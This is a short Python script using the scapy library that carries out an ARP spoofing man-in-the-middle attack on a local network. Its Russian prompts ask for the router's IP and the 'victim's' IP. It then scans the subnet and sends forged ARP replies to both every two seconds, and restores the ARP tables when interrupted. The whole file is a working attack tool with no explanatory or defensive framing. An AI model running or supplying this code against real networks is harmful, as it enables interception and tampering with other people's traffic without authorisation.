import scapy.all as scapy 

import time 
route = input('Введите ip адрес роутера (прим: X.X.X.X): ') 

while True: 
    print(scapy.arping(route+'/24'))
    target = input('Введите ip адрес жертвы (прим: X.X.X.X): ') 
    if target == '' or target == ' ': 
        continue
    else: 
        break 
    
def get_mac(ip): 
    return scapy.getmacbyip(ip)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 4, verbose = False)

sent_pakets_count = 0

try:
    while True:
        spoof(route, target)
        spoof(target, route)
        sent_pakets_count = sent_pakets_count + 2 
        print ("\r[+] Paket sent: " + str(sent_pakets_count), end="") 
        time.sleep(2)
except KeyboardInterrupt: 
    print("\n[+] Detected CTRL + C ...... Quitting.")
    restore(target, route)
    restore(route, target)
